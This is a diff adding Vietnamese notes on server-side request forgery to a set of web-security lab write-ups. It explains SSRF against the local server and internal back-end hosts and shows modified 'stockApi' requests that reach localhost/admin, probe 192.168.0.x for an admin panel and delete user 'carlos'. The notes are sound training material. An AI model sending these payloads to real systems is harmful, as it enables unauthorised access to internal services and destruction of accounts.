@@ -276,3 +276,99 @@ Và ta có thể đăng nhập vào trang cá nhân của `carlos`.
 **Nguyên nhân là trong trường hợp này 2FA (two-factor authentication) được triển khai sai. Sau khi người dùng nhập mật khẩu, trang sẽ yêu cầu mã xác thực ở bước tiếp theo, nhưng thực tế trạng thái đăng nhập đã được thiết lập từ bước nhập mật khẩu. Khi đó, có thể thử truy cập trực tiếp vào các trang chỉ dành cho người đã đăng nhập mà không cần nhập mã 2FA.**
 
 # Server-side request forgery (SSRF)
+  
+Server-side request forgery (SSRF) là một lỗ hổng bảo mật web cho phép kẻ tấn công khiến ứng dụng phía máy chủ thực hiện các yêu cầu (request) đến một vị trí ngoài ý muốn.
+
+Trong một cuộc tấn công SSRF, kẻ tấn công có thể lợi dụng máy chủ để:
+
+* Truy cập dịch vụ nội bộ trong hệ thống của tổ chức.
+
+* Kết nối đến hệ thống bên ngoài theo ý muốn.
+
+Hậu quả có thể dẫn đến rò rỉ dữ liệu nhạy cảm, ví dụ như thông tin xác thực.
+
+## SSRF attacks against the server (Tấn công SSRF nhắm vào máy chủ)
+
+Trong tấn công SSRF nhắm vào chính máy chủ, kẻ tấn công lợi dụng ứng dụng để gửi yêu cầu HTTP về chính máy chủ thông qua loopback bằng cách sử dụng URL chứa 127.0.0.1 hoặc localhost nhằm truy cập các tài nguyên hoặc chức năng nội bộ trái phép.
+
+Ứng dụng mặc định tin tưởng yêu cầu từ máy cục bộ vì:
+
+* Kiểm soát truy cập đặt ở thành phần khác → bỏ qua kiểm tra khi kết nối nội bộ.
+
+* Khôi phục hệ thống: cho phép quyền quản trị không cần đăng nhập với yêu cầu từ máy cục bộ.
+
+* Giao diện quản trị dùng cổng riêng, chỉ truy cập được từ nội bộ.
+
+### Ví dụ
+
+**Lab: Basic SSRF against the local server**
+
+Phòng lab này có một tính năng kiểm tra tồn kho (stock check) dùng để lấy dữ liệu từ hệ thống nội bộ.
+
+Khi người dùng sử stock check thì sẽ có request như sau:
+
+```http
+POST /product/stock HTTP/2
+Content-Length: 107
+Content-Type: application/x-www-form-urlencoded
+stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+```
+
+Tiến hành sửa  request để chỉ định một URL cục bộ trên máy chủ:
+
+```http
+POST /product/stock HTTP/2
+Content-Length: 107
+Content-Type: application/x-www-form-urlencoded
+stockApi=http%3a%2f%2flocalhost%2fadmin
+```
+
+Khi đó, máy chủ sẽ truy cập vào URL /admin và trả lại toàn bộ nội dung của trang admin.
+
+Nhưng nếu bạn thao với các chức năng trên trang /admin thì sẽ không được vì sẽ bị kiểm tra quyền truy cập vì vậy ta sẽ phải thay đổi để request này được yêu cầu từ loopback:
+
+```http
+POST /product/stock HTTP/2
+Content-Length: 107
+Content-Type: application/x-www-form-urlencoded
+stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete?username=carlos
+```
+
+## SSRF attacks against other back-end systems (Tấn công SSRF nhắm vào hệ thống back-end)
+
+* Máy chủ ứng dụng đôi khi có thể tương tác với các hệ thống back-end nằm trong mạng nội bộ mà người dùng bên ngoài không thể truy cập.
+
+* Các hệ thống này thường dùng địa chỉ IP riêng và được bảo vệ bởi cấu trúc mạng, nên bảo mật thường yếu hơn.
+
+* Nếu kẻ tấn công khai thác lỗ hổng SSRF, họ có thể gửi yêu cầu gián tiếp thông qua máy chủ ứng dụng để truy cập các chức năng nhạy cảm trên hệ thống back-end, thậm chí không cần xác thực.
+
+**Lab: Basic SSRF against another back-end system**
+
+Trong phòng lab này cũng có chức năng stock check và có request như sau:
+
+```http
+POST /product/stock HTTP/2
+Content-Length: 96
+Content-Type: application/x-www-form-urlencoded
+stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D4%26storeId%3D1
+```
+
+Trong lab này request này sẽ tương tác với một hệ thống back-end với địa chỉ là 192.168.0.1:8080 để yêu cầu stock check. 
+
+Tiến hành thay đổi URL để chỉ định đến trang admin với định dạng `http://192.168.0.x:8080/admin` với x sẽ là một ip từ `1-255`. Tiến hành dò x thì ta sẽ có `x=18` và ta có được request như sau:
+
+```http
+POST /product/stock HTTP/2
+Content-Length: 96
+Content-Type: application/x-www-form-urlencoded
+stockApi=http%3A%2F%2F192.168.0.18%3A8080%2Fadmin
+```
+
+Thay đổi request để có thể xóa `user=carlos` từ loopback
+
+```http
+POST /product/stock HTTP/2
+Content-Length: 96
+Content-Type: application/x-www-form-urlencoded
+stockApi=http%3A%2F%2F192.168.0.18%3A8080%2Fadmin%2Fdelete?username=carlos
+```
